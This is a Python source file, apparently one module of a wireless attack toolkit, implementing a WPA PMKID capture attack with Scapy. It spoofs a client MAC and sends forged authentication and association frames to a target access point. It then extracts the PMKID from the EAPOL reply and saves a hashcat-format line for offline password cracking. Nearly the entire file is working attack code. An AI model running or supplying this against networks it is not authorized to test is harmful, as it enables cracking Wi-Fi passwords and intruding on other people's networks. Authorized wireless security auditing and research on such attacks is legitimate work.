from __future__ import annotations

import os
import random
import signal
import struct
import time
from dataclasses import dataclass

from scapy.all import EAPOL, Dot11, Dot11AssoReq, Dot11Auth, Dot11Beacon, Dot11Elt, Dot11ProbeResp, RadioTap, Scapy_Exception, sendp, sniff

from debugs import debug


@dataclass
class PmkidArgs:
    interface: str
    bssid: str
    channel: int
    ssid: str = ""
    capture_timeout: int = 60
    output_path: str | None = None
    client_mac: str | None = None


@dataclass
class PmkidResult:
    success: bool
    ssid: str
    bssid: str
    channel: int
    pmkid: str | None = None
    hashcat_line: str | None = None
    output_file: str | None = None
    error: str | None = None


def pmkid(args: PmkidArgs) -> PmkidResult:
    return _PmkidCaptureModule(args).run()


class PmkidCaptureModule:
    def __init__(self, args: PmkidArgs):
        self.args = args

    def run(self) -> PmkidResult:
        return pmkid(self.args)


_RSN_IE_ID = 48
_PMKID_OUI = b"\x00\x0f\xac"
_PMKID_TYPE = 4


class _PmkidCaptureModule:
    def __init__(self, args: PmkidArgs):
        self.args = args
        self.interface = args.interface
        self.target_bssid = args.bssid.upper()
        self.target_channel = int(args.channel)
        self.client_mac = (args.client_mac or self._random_mac()).upper()

        self.rsn_ie_body: bytes | None = None
        self.pmkid: str | None = None
        self.stop = False

    @staticmethod
    def _random_mac() -> str:
        b = [random.randint(0, 255) for _ in range(6)]
        b[0] = (b[0] & 0xFC) | 0x02
        return ":".join(f"{x:02x}" for x in b)

    def _signal_handler(self, sig, frame) -> None:
        self.stop = True

    def _grab_rsn_ie(self) -> bool:
        debug("info", "Grabbing RSN IE from beacon...")
        found = {"rsn": None}

        def handle(pkt):
            if found["rsn"]:
                return
            if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
                return
            if pkt[Dot11].addr3.upper() != self.target_bssid:
                return
            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == _RSN_IE_ID:
                    found["rsn"] = bytes(elt.info)
                    return
                nxt = elt.payload
                elt = nxt.getlayer(Dot11Elt) if nxt and nxt.haslayer(Dot11Elt) else None

        start = time.time()
        while not found["rsn"] and time.time() - start < 10:
            try:
                sniff(iface=self.interface, prn=handle, timeout=2, store=False)
            except Scapy_Exception:
                pass

        if not found["rsn"]:
            debug("critical", "Could not obtain RSN IE")
            return False

        self.rsn_ie_body = found["rsn"]
        debug("ok", f"RSN IE captured ({len(self.rsn_ie_body)} bytes)")
        return True

    def _build_rsn_ie_with_pmkid(self) -> bytes:
        fake_pmkid = b"\x00" * 16
        return self.rsn_ie_body + b"\x00\x01" + fake_pmkid

    def _send_auth_assoc(self, use_pmkid: bool = False) -> None:
        client = self.client_mac
        bssid = self.target_bssid

        auth = (
            RadioTap()
            / Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)
            / Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(auth, iface=self.interface, count=2, inter=0.05, verbose=0)

        ssid_bytes = self.args.ssid.encode(errors="ignore") if self.args.ssid else b""
        rsn_body = self._build_rsn_ie_with_pmkid() if use_pmkid else self.rsn_ie_body

        assoc = (
            RadioTap()
            / Dot11(type=0, subtype=0, addr1=bssid, addr2=client, addr3=bssid)
            / Dot11AssoReq(cap=0x0411, listen_interval=10)
            / Dot11Elt(ID=0, info=ssid_bytes)
            / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
            / Dot11Elt(ID=_RSN_IE_ID, info=rsn_body)
        )
        sendp(assoc, iface=self.interface, count=2, inter=0.05, verbose=0)
        debug("info", f"Auth/Assoc sent (pmkid_trigger={use_pmkid})")

    @staticmethod
    def _extract_pmkid(eapol: bytes) -> str | None:
        if len(eapol) < 99:
            return None
        if eapol[1] != 0x03:
            return None

        kd_len = struct.unpack(">H", eapol[97:99])[0]
        kd = eapol[99:99 + kd_len]

        i = 0
        while i + 2 <= len(kd):
            eid, elen = kd[i], kd[i + 1]
            body = kd[i + 2:i + 2 + elen]
            if (eid == 221 and len(body) >= 20
                    and body[:3] == _PMKID_OUI and body[3] == _PMKID_TYPE):
                return body[4:20].hex()
            i += 2 + elen
        return None

    def _eapol_handler(self, pkt) -> None:
        if self.pmkid or self.stop:
            return
        if not pkt.haslayer(EAPOL) or not pkt.haslayer(Dot11):
            return
        if pkt[Dot11].addr3 is None or pkt[Dot11].addr3.upper() != self.target_bssid:
            return

        try:
            raw = bytes(pkt[EAPOL])
        except (Scapy_Exception, AttributeError, ValueError):
            return

        pmkid_hex = self._extract_pmkid(raw)
        if pmkid_hex:
            self.pmkid = pmkid_hex
            self.stop = True
            debug("ok", f"PMKID: {pmkid_hex}")

    def _hashcat_line(self) -> str | None:
        if not self.pmkid:
            return None
        bssid_hex = self.target_bssid.replace(":", "").lower()
        sta_hex = self.client_mac.replace(":", "").lower()
        ssid_hex = (self.args.ssid or "").encode(errors="ignore").hex()
        return f"WPA*01*{self.pmkid}*{bssid_hex}*{sta_hex}*{ssid_hex}***"

    def _capture(self) -> bool:
        self.pmkid = None
        self.stop = False

        if not self._grab_rsn_ie():
            return False

        start = time.time()
        next_assoc = time.time()
        attempt = 0

        while not self.stop and time.time() - start < self.args.capture_timeout:
            if time.time() >= next_assoc:
                use_pmkid = (attempt % 2 == 1)
                self._send_auth_assoc(use_pmkid=use_pmkid)
                attempt += 1
                next_assoc = time.time() + 4

            try:
                sniff(iface=self.interface, prn=self._eapol_handler, timeout=2, store=False)
            except Scapy_Exception as e:
                debug("warn", f"Sniff error: {e}")
                time.sleep(0.3)

        return self.pmkid is not None

    def run(self) -> PmkidResult:
        result = PmkidResult(
            success=False, ssid=self.args.ssid,
            bssid=self.target_bssid, channel=self.target_channel,
        )

        prev_sigint = signal.getsignal(signal.SIGINT)
        try:
            signal.signal(signal.SIGINT, self._signal_handler)

            debug("ok", f"PMKID target: {self.args.ssid or '<Hidden>'} "
                        f"({self.target_bssid}) ch {self.target_channel} "
                        f"spoof {self.client_mac}")

            if not self._capture():
                result.error = "no_pmkid_captured"
                debug("warn", "No PMKID. AP likely disables PMKID (WPA3/Wi-Fi 6). "
                              "Fall back to handshake module.")
                return result

            result.success = True
            result.pmkid = self.pmkid
            result.hashcat_line = self._hashcat_line()

            if result.hashcat_line and self.args.output_path:
                try:
                    with open(self.args.output_path, "w") as f:
                        f.write(result.hashcat_line + "\n")
                    result.output_file = self.args.output_path
                    debug("ok", f"Saved to {self.args.output_path}")
                except OSError as e:
                    debug("error", f"Save failed: {e}")

            return result
        except Exception as e:  # noqa: BLE001
            debug("critical", f"PMKID error: {e}")
            result.error = str(e)
            return result
        finally:
            signal.signal(signal.SIGINT, prev_sigint)